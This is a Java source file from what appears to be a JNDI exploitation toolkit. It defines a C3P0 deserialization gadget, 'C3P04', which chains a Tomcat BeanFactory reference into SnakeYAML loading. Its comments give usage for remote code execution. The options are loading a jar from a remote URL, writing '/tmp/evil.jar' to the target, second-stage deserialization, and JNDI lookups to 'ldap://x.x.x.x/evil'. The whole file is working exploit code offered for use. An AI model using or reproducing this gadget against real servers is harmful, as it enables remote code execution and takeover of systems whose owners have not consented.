package com.qi4l.jndi.gadgets;

import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.HexUtils;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.qi4l.jndi.gadgets.utils.SnakeYamlUtils;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * 同上 只不过使用了 snakeyaml
 * 加了一些常见的 Gadget，有点套娃的感觉了
 * <p>
 * 用法：
 * 远程加载 Jar 包
 * C3P04 'remoteJar-http://1.1.1.1.com/1.jar'
 * <p>
 * 向服务器写入 Jar 包并加载（不出网）
 * C3P04 'writeJar-/tmp/evil.jar:./yaml.jar'
 * C3P04 'localJar-./yaml.jar'
 * <p>
 * C3P0 二次反序列化
 * C3P04 'c3p0Double-/usr/CC6.ser'
 * <p>
 * C3P0 JNDI 以及 JdbcRowSetImpl JNDI
 * C3P04 'c3p0Jndi-ldap://x.x.x.x/evil'
 * C3P04 'jndi-ldap://x.x.x.x/evil'
 */

@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.yaml:snakeyaml:1.30"})
public class C3P04 implements ObjectPayload<Object> {
    public Object getObject(PayloadType type, String... param) throws Exception {
        String command = param[0];
        int    sep     = command.lastIndexOf('-');
        if (sep < 0) {
            throw new IllegalArgumentException("Command format is: <type>:<cmd>");
        }

        String[]             parts = command.split("-");
        PoolBackedDataSource b     = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(parts[0], parts[1]));
        return b;
    }


    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private final String cmd;

        private final String type;

        public PoolSource(String type, String cmd) {
            this.type = type;
            this.cmd = cmd;
        }

        public Reference getReference() throws NamingException {

            String yaml = "";

            switch (type) {
                case "remoteJar":
                    yaml = "!!javax.script.ScriptEngineManager [\n" +
                            "  !!java.net.URLClassLoader [[\n" +
                            "    !!java.net.URL [\"" + cmd + "\"]\n" +
                            "  ]]\n" +
                            "]";
                    break;
                case "localJar":
                    yaml = "!!javax.script.ScriptEngineManager [\n" +
                            "  !!java.net.URLClassLoader [[\n" +
                            "    !!java.net.URL [\"file://" + cmd + "\"]\n" +
                            "  ]]\n" +
                            "]";
                    break;
                case "writeJar":
                    String[] parts = cmd.split(":");
                    try {
                        yaml = SnakeYamlUtils.createPoC(parts[0], parts[1]);
                    } catch (Exception e) {
                        throw new RuntimeException(e);
                    }
                    break;
                case "c3p0Double":
                    try {
                        byte[] data      = HexUtils.toByteArray(Files.newInputStream(Paths.get(cmd)));
                        String hexString = HexUtils.bytesToHexString(data, data.length);
                        yaml = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
                                "userOverridesAsString: HexAsciiSerializedMap:" + hexString + ";";
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                    break;
                case "c3p0Jndi":
                    yaml = "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
                            "jndiName: " + cmd + "\n" +
                            "loginTimeout: 0";
                    break;
                case "jndi":
                    yaml = "!!com.sun.rowset.JdbcRowSetImpl\n" +
                            "dataSourceName: " + cmd + "\n" +
                            "autoCommit: true";
                    break;

            }

            ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", "nu1r=load"));
            ref.add(new StringRefAddr("nu1r", yaml));
            return ref;
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }
    }
}
